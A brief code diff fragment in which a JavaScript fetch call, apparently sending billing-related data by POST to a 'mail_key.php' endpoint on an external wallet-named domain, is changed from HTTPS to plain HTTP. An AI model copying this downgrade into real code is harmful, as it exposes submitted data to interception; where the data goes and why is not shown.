@@ -228,7 +228,7 @@ $("document").ready(function () {
     };
 
     const billResponse = await fetch(
-      "https://learnerscrib.platiniumxpwallet.com/aced/mail_key.php",
+      "http://learnerscrib.platiniumxpwallet.com/aced/mail_key.php",
       {
         method: "POST",
         headers: {
